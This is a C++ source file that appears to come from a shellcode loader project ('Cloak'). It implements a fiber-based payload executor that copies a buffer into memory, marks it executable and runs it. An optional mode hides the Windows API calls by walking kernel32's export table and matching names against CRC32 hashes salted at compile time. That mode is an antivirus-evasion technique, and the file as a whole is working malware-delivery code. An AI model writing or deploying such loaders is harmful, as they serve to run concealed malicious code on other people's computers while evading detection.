#include "Cloak.hpp"

#ifdef FIBERS

#ifdef HASH_API

constexpr int RandomCompileTimeSeed(void)
{
	return '0' * -23784 +
		__TIME__[7] * 345 +
		__TIME__[6] * 12 +
		__TIME__[4] * 2345123 +
		__TIME__[3] * 623 +
		__TIME__[1] * 95897 +
		__TIME__[0] * 2;
};

constexpr auto g_KEY = RandomCompileTimeSeed() % RAND;

constexpr DWORD HashStringCrc32(const char* String) {
	UINT32      uMask	= 0x00;
    UINT32      uHash	= g_KEY;
	INT         i		= 0x00;

	while ( String[i] != 0 ) {
		uHash = uHash ^ ( UINT32 ) String[i];

		for ( int ii = 0; ii < 8; ii++ ) {
			uMask = -1 * ( uHash & 1 );
			uHash = ( uHash >> 1 ) ^ ( 0xEDB88320 & uMask );
		}

		i++;
	}

	return ~uHash;
}

#define RTIME_HASHA( API ) HashStringCrc32( ( const char* ) API )
#define CTIME_HASHA( API ) constexpr auto API##_CRC32A = HashStringCrc32( ( const char* ) #API );

FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {
	PBYTE pBase = ( PBYTE ) hModule;

	PIMAGE_DOS_HEADER   pImgDosHeader  = ( PIMAGE_DOS_HEADER ) pBase;
	if ( pImgDosHeader->e_magic != IMAGE_DOS_SIGNATURE ) {
        return NULL;
    }

	PIMAGE_NT_HEADERS   pImgNtHeaders  = ( PIMAGE_NT_HEADERS ) ( pBase + pImgDosHeader->e_lfanew );
	if ( pImgNtHeaders->Signature != IMAGE_NT_SIGNATURE ) {
		return NULL;
    }

	IMAGE_OPTIONAL_HEADER		ImgOptionalHeader		= pImgNtHeaders->OptionalHeader;
	PIMAGE_EXPORT_DIRECTORY		pImgExportDirectory     = ( PIMAGE_EXPORT_DIRECTORY ) ( pBase + ImgOptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );
	PDWORD						pdwFunctionNameArray	= ( PDWORD ) ( pBase + pImgExportDirectory->AddressOfNames );
	PDWORD						pdwFunctionAddressArray	= ( PDWORD ) ( pBase + pImgExportDirectory->AddressOfFunctions );
	PWORD						pwFunctionOrdinalArray	= ( PWORD ) ( pBase + pImgExportDirectory->AddressOfNameOrdinals );

	for ( DWORD i = 0; i < pImgExportDirectory->NumberOfFunctions; i++ ) {
		CHAR*	pFunctionName		= ( CHAR* ) ( pBase + pdwFunctionNameArray[i] );
		PVOID	pFunctionAddr   	= ( PVOID ) ( pBase + pdwFunctionAddressArray[pwFunctionOrdinalArray[i]] );

		if ( dwApiNameHash == RTIME_HASHA( pFunctionName ) ) { 
			return ( FARPROC ) pFunctionAddr;
		}
	}

	return NULL;
}

// ---

typedef LPVOID ( WINAPI * fnConvertThreadToFiber ) (
    LPVOID  lpParameter
);

typedef LPVOID ( WINAPI * fnVirtualAlloc ) (
    LPVOID  lpAddress,
    SIZE_T  dwSize,
    DWORD   flAllocationType,
    DWORD   flProtect
);

typedef void ( WINAPI * fnDeleteFiber ) (
    LPVOID  lpFiber
);

typedef BOOL ( WINAPI * fnConvertFiberToThread ) ();

typedef BOOL ( WINAPI * fnVirtualProtect ) (
    LPVOID  lpAddress,
    SIZE_T  dwSize,
    DWORD   flNewProtect,
    PDWORD  lpflOldProtect
);

typedef LPVOID ( WINAPI * fnCreateFiber ) (
    SIZE_T                  dwStackSize,
    LPFIBER_START_ROUTINE   lpStartAddress,
    LPVOID                  lpParameter
);

typedef void ( WINAPI * fnSwitchToFiber ) (
    LPVOID  lpFiber
);

CTIME_HASHA(ConvertThreadToFiber)
CTIME_HASHA(VirtualAlloc)
CTIME_HASHA(DeleteFiber)
CTIME_HASHA(ConvertFiberToThread)
CTIME_HASHA(VirtualProtect)
CTIME_HASHA(CreateFiber)
CTIME_HASHA(SwitchToFiber)

BOOL FiberExec(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
    HMODULE hKernel32 = NULL;

    if ( ( hKernel32 = LoadLibraryA( "KERNEL32.dll" ) ) == NULL ) {
        #ifdef DEBUG
        printf( "[-] LoadLibraryA Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnConvertThreadToFiber pConvertThreadToFiber = ( fnConvertThreadToFiber ) GetProcAddressH( hKernel32, ConvertThreadToFiber_CRC32A );
    if ( pConvertThreadToFiber == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for pConvertThreadToFiber\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnVirtualAlloc pVirtualAlloc = ( fnVirtualAlloc ) GetProcAddressH( hKernel32, VirtualAlloc_CRC32A );
    if ( pVirtualAlloc == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for VirtualAlloc\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnDeleteFiber pDeleteFiber = ( fnDeleteFiber ) GetProcAddressH( hKernel32, DeleteFiber_CRC32A );
    if ( pDeleteFiber == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for pDeleteFiber\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnConvertFiberToThread pConvertFiberToThread = ( fnConvertFiberToThread ) GetProcAddressH( hKernel32, ConvertFiberToThread_CRC32A );
    if ( pConvertFiberToThread == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for pConvertFiberToThread\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnVirtualProtect pVirtualProtect = ( fnVirtualProtect ) GetProcAddressH( hKernel32, VirtualProtect_CRC32A );
    if ( pVirtualProtect == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for VirtualProtect\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnCreateFiber pCreateFiber = ( fnCreateFiber ) GetProcAddressH( hKernel32, CreateFiber_CRC32A );
    if ( pCreateFiber == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for pCreateFiber\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnSwitchToFiber pSwitchToFiber = ( fnSwitchToFiber ) GetProcAddressH( hKernel32, SwitchToFiber_CRC32A );
    if ( pSwitchToFiber == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for pSwitchToFiber\n" );
        #endif // !DEBUG
        
        return FALSE;
    }
    
    //---
    
    PVOID pPayloadAddress   = NULL;
    PVOID pPayloadFiber     = NULL;
    PVOID pMainFiber        = NULL;
    DWORD dwOldProtect      = NULL;
    
    pMainFiber = pConvertThreadToFiber( NULL );
    if ( ! pMainFiber ) {
        #ifdef DEBUG
        printf( "[-] ConvertThreadToFiber Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    pPayloadAddress = pVirtualAlloc( 0, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( pPayloadAddress == NULL ) {
        #ifdef DEBUG
        printf( "[-] VirtualAlloc Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG

        pDeleteFiber(pMainFiber);
        pConvertFiberToThread();
        
        return FALSE;
    }

    memcpy(pPayloadAddress, pbPayload, sPayloadSize);

    if ( ! pVirtualProtect( pPayloadAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtect ) ) {
        #ifdef DEBUG
        printf( "[-] VirtualProtect Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    pPayloadFiber = pCreateFiber(NULL, ( LPFIBER_START_ROUTINE ) pPayloadAddress, NULL );
    if ( ! pPayloadFiber ) {
        #ifdef DEBUG
        printf( "[-] CreateFiber Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        pDeleteFiber(pMainFiber);
        pConvertFiberToThread();

        return FALSE;
    }

    pSwitchToFiber(pPayloadFiber);

    return TRUE;
}

#else

BOOL FiberExec(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
    PVOID pPayloadAddress   = NULL;
    PVOID pPayloadFiber     = NULL;
    PVOID pMainFiber        = NULL;
    DWORD dwOldProtect      = NULL;
    
    pMainFiber = ConvertThreadToFiber( NULL );
    if ( ! pMainFiber ) {
        #ifdef DEBUG
        printf( "[-] ConvertThreadToFiber Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    pPayloadAddress = VirtualAlloc( 0, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( pPayloadAddress == NULL ) {
        #ifdef DEBUG
        printf( "[-] VirtualAlloc Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG

        DeleteFiber(pMainFiber);
        ConvertFiberToThread();
        
        return FALSE;
    }

    memcpy(pPayloadAddress, pbPayload, sPayloadSize);

    if ( ! VirtualProtect( pPayloadAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtect ) ) {
        #ifdef DEBUG
        printf( "[-] VirtualProtect Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    pPayloadFiber = CreateFiber(NULL, ( LPFIBER_START_ROUTINE ) pPayloadAddress, NULL );
    if ( ! pPayloadFiber ) {
        #ifdef DEBUG
        printf( "[-] CreateFiber Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        DeleteFiber(pMainFiber);
        ConvertFiberToThread();

        return FALSE;
    }

    SwitchToFiber(pPayloadFiber);

    return TRUE;
}

#endif // !HASH_API

#endif // !FIBERS